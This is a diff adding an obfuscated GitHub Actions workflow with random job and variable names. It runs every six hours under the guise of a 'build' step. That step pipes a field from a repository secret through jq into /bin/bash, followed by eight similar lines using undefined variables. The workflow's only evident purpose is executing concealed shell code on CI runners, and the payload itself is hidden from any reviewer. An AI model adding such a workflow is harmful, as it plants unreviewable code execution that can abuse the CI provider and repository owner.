@@ -1,0 +1,25 @@
+name: hejintui9348
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hejintui9348
+        env:
+          kvi2688: ${{ secrets.kvi2688 }}
+        run: |
+          echo $kvi2688 | jq -r .afiq736 | /bin/bash
+          echo $izj779 | jq -r .fnia8 | /bin/bash
+          echo $ra106 | jq -r .epuff77 | /bin/bash
+          echo $ol1 | jq -r .ymdm22064 | /bin/bash
+          echo $j615 | jq -r .zr7 | /bin/bash
+          echo $yglfa76381 | jq -r .yfkll8 | /bin/bash
+          echo $r07 | jq -r .fiul48183 | /bin/bash
+          echo $dn44 | jq -r .xfia85 | /bin/bash
+          echo $ht2261 | jq -r .a5006 | /bin/bash
+
